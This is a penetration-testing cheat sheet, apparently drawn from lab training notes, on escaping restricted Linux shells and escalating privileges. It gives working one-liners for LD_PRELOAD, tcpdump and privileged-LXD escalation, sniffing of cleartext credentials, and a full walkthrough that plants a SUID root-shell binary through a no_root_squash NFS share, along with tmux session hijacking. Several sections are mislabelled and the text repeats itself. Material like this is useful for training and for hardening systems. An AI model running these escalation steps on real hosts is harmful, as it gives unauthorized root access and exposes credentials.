# Miscellaneous Techniques

#### Command Injection

```text
This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.
```

```bash
haunter@$target[/home]$ ls -l `pwd` 
```

#### Command Substition

```text
For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.
```

#### Command Chaining

```text
We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.
```

#### Environmental Variables

```text
For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.
```

#### Shell Functions

```text
For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.
```



```bash
gcc kernel_expoit.c -o kernel_expoit #	Compile an exploit written in C
screen -v	# Check the installed version of Screen
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root	# Priv esc with tcpdump
ldd /bin/ls	# View the shared objects required by a binary
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart	# Escalate privileges using LD_PRELOAD
readelf -d payroll | grep PATH	# Check the RUNPATH of a binary
gcc src.c -fPIC -shared -o /development/libshared.so	# Compiled a shared libary
lxd init	# Start the LXD initialization process
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine	# Import a local image
lxc init alpine r00t -c security.privileged=true	 # Start a privileged LXD container
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true	# Mount the host file system in a container
lxc start r00t	# Start the container
showmount -e 10.129.2.12	# Show the NFS export list
sudo mount -t nfs 10.129.2.12:/tmp /mnt	# Mount an NFS share locally
tmux -S /shareds new -s debugsess	# Created a shared tmux session socket
./lynis audit system	# Perform a system audit with Lynis
```



Passive Traffic Capture
If tcpdump is installed, unprivileged users may be able to capture network traffic, including, in some cases, credentials passed in cleartext. Several tools exist, such as net-creds and PCredz that can be used to examine data being passed on the wire. This may result in capturing sensitive information such as credit card numbers and SNMP community strings. It may also be possible to capture Net-NTLMv2, SMBv2, or Kerberos hashes, which could be subjected to an offline brute force attack to reveal the plaintext password. Cleartext protocols such as HTTP, FTP, POP, IMAP, telnet, or SMTP may contain credentials that could be reused to escalate privileges on the host.

Weak NFS Privileges
Network File System (NFS) allows users to access shared files or directories over the network hosted on Unix/Linux systems. NFS uses TCP/UDP port 2049. Any accessible mounts can be listed remotely by issuing the command showmount -e, which lists the NFS server's export list (or the access control list for filesystems) that NFS clients.

  Miscellaneous Techniques
haunteractual@htb[/htb]$ showmount -e 10.129.2.12

Export list for 10.129.2.12:
/tmp             *
/var/nfs/general *
When an NFS volume is created, various options can be set:

Option	Description
root_squash	If the root user is used to access NFS shares, it will be changed to the nfsnobody user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the nfsnobody user, which prevents an attacker from uploading binaries with the SUID bit set.
no_root_squash	Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.
  Miscellaneous Techniques
haunter@$target:~$ cat /etc/exports

# /etc/exports: the access control list for filesystems which may be exported
#		to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/var/nfs/general *(rw,no_root_squash)
/tmp *(rw,no_root_squash)
For example, we can create a SETUID binary that executes /bin/sh using our local root user. We can then mount the /tmp directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit.

First, create a simple binary, mount the directory locally, copy it, and set the necessary permissions.

  Miscellaneous Techniques
root@Pwnbox:/tmp$ cat shell.c 

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}
  Miscellaneous Techniques
root@Pwnbox:/tmp$ gcc shell.c -o shell
  Miscellaneous Techniques
root@Pwnbox:/tmp$ sudo mount -t nfs 10.129.2.12:/tmp /mnt
root@Pwnbox:/tmp$ cp shell /mnt
root@Pwnbox:/tmp$ chmod u+s /mnt/shell
When we switch back to the host's low privileged session, we can execute the binary and obtain a root shell.

  Miscellaneous Techniques
haunter@$target:/tmp$  ls -la

total 68
drwxrwxrwt 10 root  root   4096 Sep  1 06:15 .
drwxr-xr-x 24 root  root   4096 Aug 31 02:24 ..
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  1 05:35 .ICE-unix
-rwsr-xr-x  1 root  root  16712 Sep  1 06:15 shell
<SNIP>
  Miscellaneous Techniques
haunter@$target:/tmp$ ./shell
root@$target:/tmp# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(htb)
Hijacking Tmux Sessions
Terminal multiplexers such as tmux can be used to allow multiple terminal sessions to be accessed within a single console session. When not working in a tmux window, we can detach from the session, still leaving it active (i.e., running an nmap scan). For many reasons, a user may leave a tmux process running as a privileged user, such as root set up with weak permissions, and can be hijacked. This may be done with the following commands to create a new shared session and modify the ownership.

  Miscellaneous Techniques
haunter@$target:~$ tmux -S /shareds new -s debugsess
haunter@$target:~$ chown root:devs /shareds
If we can compromise a user in the devs group, we can attach to this session and gain root access.

Check for any running tmux processes.

  Miscellaneous Techniques
haunter@$target:~$  ps aux | grep tmux

root      4806  0.0  0.1  29416  3204 ?        Ss   06:27   0:00 tmux -S /shareds new -s debugsess
Confirm permissions.

  Miscellaneous Techniques
haunter@$target:~$ ls -la /shareds 

srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
Review our group membership.

  Miscellaneous Techniques
haunter@$target:~$ id

uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)
Finally, attach to the tmux session and confirm root privileges.

  Miscellaneous Techniques
haunter@$target:~$ tmux -S /shareds

id

uid=0(root) gid=0(root) groups=0(root)
